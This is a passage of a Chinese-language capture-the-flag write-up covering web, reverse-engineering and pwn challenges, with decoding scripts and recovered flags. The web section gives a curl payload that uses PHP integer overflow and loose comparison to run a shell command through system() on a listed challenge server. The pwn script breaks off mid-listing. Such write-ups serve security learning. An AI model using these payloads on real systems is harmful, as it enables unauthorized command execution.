</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>foreach</span>(<span style=color:#8be9fd;font-style:italic>$v4</span> <span style=color:#ff79c6>as</span> <span style=color:#8be9fd;font-style:italic>$key</span> <span style=color:#ff79c6>=&gt;</span> <span style=color:#8be9fd;font-style:italic>$cmd</span>){
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>$key</span> <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>$system_function</span>){
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            <span style=color:#8be9fd;font-style:italic>$v5</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>$v5</span> <span style=color:#ff79c6>&amp;&amp;</span> strlen(<span style=color:#8be9fd;font-style:italic>$v3</span>)<span style=color:#ff79c6>&gt;</span><span style=color:#bd93f9>11</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#8be9fd;font-style:italic>$number</span> <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>3</span>){
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>            <span style=color:#8be9fd;font-style:italic>$system_function</span>(<span style=color:#8be9fd;font-style:italic>$cmd</span>,<span style=color:#8be9fd;font-style:italic>$key</span>); 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#8be9fd;font-style:italic>$number</span><span style=color:#ff79c6>++</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>}<span style=color:#ff79c6>else</span>{    
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#ff79c6>echo</span> <span style=color:#f1fa8c>&#34;sorry&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>highlight_file(<span style=color:#f1fa8c>&#39;hhhhhhhhhhhhhhhh_exec.php&#39;</span>);
</span></span></code></pre></div><p>一步一步看代码, 一眼看是不可能进行利用的, 在 <code>if($v2 === $v1 & $v2[0] != 'admin')</code> 常理是不可能绕过的, 但是看一下php版本, 也是前两天看youtube看到了这一个技巧, 在php5.5.9中会产生int溢出, 2^32 = 4294967296 会解析成0, 这样就可以绕过这一步.<br>POST输入v4, GET输入v3, 并且v3要比11个字符要长.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>$key</span> <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>$system_function</span>){
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#8be9fd;font-style:italic>$v5</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>}
</span></span></code></pre></div><p>双等于号用弱类型就可以绕过.<br>比如：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#8be9fd;font-style:italic>$a</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;asdsadsad&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#8be9fd;font-style:italic>$b</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#ff79c6>echo</span> <span style=color:#8be9fd;font-style:italic>$a</span><span style=color:#ff79c6>==</span><span style=color:#8be9fd;font-style:italic>$b</span>;
</span></span></code></pre></div><p>这时就会输出1.<br>v5,$v3就已经满足了, 只需要将命令作为第三组就可以执行命令, 最后payload：<br><code>curl "http://212.64.89.186:9992/hhhhhhhhhhhhhhhh_exec.php/hhhhhhhhhhhhhhhh_exec.php?v3=aaaaaaaaaaaaaaaaaaaaa&0=asd&system=cat%20index.php" -d "v2[4294967296]=admin&v2[1]=test"</code></p><p>得到 flag{PhP_1S_Best_Lang}</p><h2 id=reserve>Reserve</h2><h3 id=0x01-ios13>0x01 iOS13</h3><p>改一下版本号安装到 iPhone 上, 不过, 我没有 iOS 设备啊, 那就&mldr;.</p><p>把整个 ipa 拖入 ida 内,最后发现 <code>iOS13</code> 内有 <code>C1CTF&amp;#123;%s&amp;#125;</code>, 而 iOS13dyn 内有剩下的 flag</p><p>可以看到 0 是参数, 所以 %d 应该用 0 替代.</p><h3 id=0x02captcha>0x02 Captcha</h3><p>如果当成 Misc 来做的话可以直接用CE修改, 改成只需要输入 1 个验证码就可以结束</p><h3 id=0x03adjacent>0x03 Adjacent</h3><p>注意反编译后的这一条语句:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>if</span> (((<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span>)s[i <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>^</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span>)s[i]) <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>*</span>(<span style=color:#ff79c6>&amp;</span>v5 <span style=color:#ff79c6>+</span> i))
</span></span></code></pre></div><p>实际上就是把字符串中相邻两个字节进行异或, 前面的结果进行比较, 我们知道flag开头是 <code>C1CTF{xxxx}</code></p><p>就算不知道是 C 开头, 也知道是 <code>}</code> 结尾</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>char</span> flag2[<span style=color:#bd93f9>31</span>] <span style=color:#ff79c6>=</span> { <span style=color:#bd93f9>0x72</span>,<span style=color:#bd93f9>0x72</span>,<span style=color:#bd93f9>0x17</span>,<span style=color:#bd93f9>0x12</span>,<span style=color:#bd93f9>0x3d</span>,<span style=color:#bd93f9>0x23</span>,<span style=color:#bd93f9>0x68</span>,<span style=color:#bd93f9>0x42</span>,<span style=color:#bd93f9>0x2d</span>,<span style=color:#bd93f9>0x1e</span>,<span style=color:#bd93f9>0x25</span>,<span style=color:#bd93f9>0x0e</span>,<span style=color:#bd93f9>0x0b</span>,<span style=color:#bd93f9>0x22</span>,<span style=color:#bd93f9>0x70</span>,<span style=color:#bd93f9>0x5d</span>,<span style=color:#bd93f9>0x1a</span>,<span style=color:#bd93f9>0x2b</span>,<span style=color:#bd93f9>0x3c</span>,<span style=color:#bd93f9>0x2b</span>,<span style=color:#bd93f9>0x29</span>,<span style=color:#bd93f9>0x13</span>,<span style=color:#bd93f9>0x2d</span>,<span style=color:#bd93f9>0x66</span>,<span style=color:#bd93f9>0x0f</span>,<span style=color:#bd93f9>0x62</span>,<span style=color:#bd93f9>0x2d</span>,<span style=color:#bd93f9>0x2a</span>,<span style=color:#bd93f9>0x29</span>,<span style=color:#bd93f9>0x13</span>,<span style=color:#bd93f9>0x14</span> };
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>char</span> flag[<span style=color:#bd93f9>33</span>] <span style=color:#ff79c6>=</span> { <span style=color:#f1fa8c>&#39;C&#39;</span> };
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>; i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>32</span>; i<span style=color:#ff79c6>++</span>) {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    flag[i] <span style=color:#ff79c6>=</span> flag2[i<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>^</span> flag[i <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>];
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#6272a4>//&#34;C1CTF{X0r_AdjaC3nt_cHar_96TySzi}&#34;	
</span></span></span></code></pre></div><h3 id=0x04-encoding>0x04 encoding</h3><p>这道题可以爆破, 爆破的方法就不在此说了.</p><p>第一部分是异或</p><p>第二步可以从 <code>sub_7FA</code> 得到这样的置换表：</p><p><code>nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ</code></p><p>然后</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>_BYTE \<span style=color:#ff79c6>*</span><span style=color:#ff79c6>__fastcall</span> sub_A84(<span style=color:#ff79c6>__int64</span> a1, _BYTE \<span style=color:#ff79c6>*</span>a2)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>  _BYTE <span style=color:#ff79c6>*</span>result; <span style=color:#6272a4>// rax
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#6272a4></span>  _BYTE <span style=color:#ff79c6>*</span>v3; <span style=color:#6272a4>// [rsp+0h] [rbp-20h]
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>char</span> v4; <span style=color:#6272a4>// [rsp+19h] [rbp-7h]
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span> v5; <span style=color:#6272a4>// [rsp+1Ah] [rbp-6h]
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span> i; <span style=color:#6272a4>// [rsp+1Bh] [rbp-5h]
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>int</span> v7; <span style=color:#6272a4>// [rsp+1Ch] [rbp-4h]
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>  v3 <span style=color:#ff79c6>=</span> a2;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>  v4 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>  v5 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>  v7 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>  <span style=color:#ff79c6>while</span> ( <span style=color:#ff79c6>*</span>(_BYTE <span style=color:#ff79c6>*</span>)(v7 <span style=color:#ff79c6>+</span> a1) )
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>  {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    \<span style=color:#ff79c6>*</span>v3<span style=color:#ff79c6>++</span> <span style=color:#ff79c6>=</span> sub_7FA((<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span>)((<span style=color:#8be9fd>int</span>)\<span style=color:#ff79c6>*</span>(<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span> <span style=color:#ff79c6>*</span>)(v7 <span style=color:#ff79c6>+</span> a1) <span style=color:#ff79c6>&gt;&gt;</span> (v5 <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>2</span>)) <span style=color:#ff79c6>|</span> v4); <span style=color:#6272a4>//舍弃 v7中的v5+2位
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#6272a4></span>    v5 <span style=color:#ff79c6>=</span> (v5 <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>2</span>) <span style=color:#ff79c6>&amp;</span> <span style=color:#bd93f9>7</span>;   <span style=color:#6272a4>// mod 8 剩余位数
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#6272a4></span>    v4 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#ff79c6>for</span> ( i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> v5; <span style=color:#ff79c6>++</span>i )
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>      v4 <span style=color:#ff79c6>|=</span> ((<span style=color:#bd93f9>1</span> <span style=color:#ff79c6>&lt;&lt;</span> i) <span style=color:#ff79c6>&amp;</span> <span style=color:#ff79c6>*</span>(<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span> <span style=color:#ff79c6>*</span>)(v7 <span style=color:#ff79c6>+</span> a1)) <span style=color:#ff79c6>&lt;&lt;</span> (<span style=color:#bd93f9>6</span> <span style=color:#ff79c6>-</span> v5);   <span style=color:#6272a4>//取出v7中剩余的位数, v5位
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#6272a4></span>    <span style=color:#ff79c6>if</span> ( v5 <span style=color:#ff79c6>&lt;=</span> <span style=color:#bd93f9>5u</span> ) <span style=color:#6272a4>// 不足五位向前取一位
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#6272a4></span>      <span style=color:#ff79c6>++</span>v7;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>  }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>  result <span style=color:#ff79c6>=</span> v3;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>  <span style=color:#ff79c6>*</span>v3 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>  <span style=color:#ff79c6>return</span> result;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>}
</span></span></code></pre></div><p>看出这是base64, 反向编码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>t <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>s <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;KFjUWyZ592NvPU1CCa5xAIRVAa4CTEN6+bjwWlqm&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>a <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>flag <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff79c6>for</span> ch <span style=color:#ff79c6>in</span> s:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    i <span style=color:#ff79c6>=</span> t<span style=color:#ff79c6>.</span>find(ch)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    a <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>{0:0&gt;6b}</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>format(i)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>,<span style=color:#8be9fd;font-style:italic>len</span>(a),<span style=color:#bd93f9>8</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff79c6>if</span> i<span style=color:#ff79c6>/</span><span style=color:#bd93f9>8</span> <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>2</span> <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        flag <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(<span style=color:#8be9fd;font-style:italic>int</span>(a[i:i<span style=color:#ff79c6>+</span><span style=color:#bd93f9>8</span>],base<span style=color:#ff79c6>=</span><span style=color:#bd93f9>2</span>) <span style=color:#ff79c6>^</span> <span style=color:#bd93f9>0xF9</span> )
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        flag <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(<span style=color:#8be9fd;font-style:italic>int</span>(a[i:i<span style=color:#ff79c6>+</span><span style=color:#bd93f9>8</span>],base<span style=color:#ff79c6>=</span><span style=color:#bd93f9>2</span>) <span style=color:#ff79c6>^</span> <span style=color:#bd93f9>0xA4</span> )
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#8be9fd;font-style:italic>print</span>(flag)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#6272a4>#C1CTF{th1s_Bas364_is_BuD9ApUy}</span>
</span></span></code></pre></div><h3 id=0x05-activate>0x05 Activate</h3><p>UTF16编码：</p><p><code>激活码无效</code> -> <code>C0 6F 3B 6D 01 78 E0 65 48 65</code></p><p>找到激活码无效这一字符串前面的分支, 下个断点</p><p>走红线 “激活完成”</p><h2 id=pwn>Pwn</h2><h3 id=0x01chekin>0x01 Chekin</h3><p>这其实算密码学题目吧&mldr;.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>import</span> socket
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>sock <span style=color:#ff79c6>=</span> socket<span style=color:#ff79c6>.</span>socket(socket<span style=color:#ff79c6>.</span>AF_INET, socket<span style=color:#ff79c6>.</span>SOCK_STREAM)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>sock<span style=color:#ff79c6>.</span>connect((<span style=color:#f1fa8c>&#34;your ip address&#34;</span>,<span style=color:#bd93f9>9990</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;2&#39;</span><span style=color:#ff79c6>+</span><span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;10&#39;</span><span style=color:#ff79c6>+</span><span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;3544388184383369539</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#8be9fd;font-style:italic>print</span>(sock<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>100</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;2&#39;</span><span style=color:#ff79c6>+</span><span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;11&#39;</span><span style=color:#ff79c6>+</span><span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;56</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>sock<span style=color:#ff79c6>.</span>sendall(payload)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#8be9fd;font-style:italic>print</span>(sock<span style=color:#ff79c6>.</span>recv(<span style=color:#bd93f9>100</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;0&#39;</span><span style=color:#ff79c6>+</span><span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>
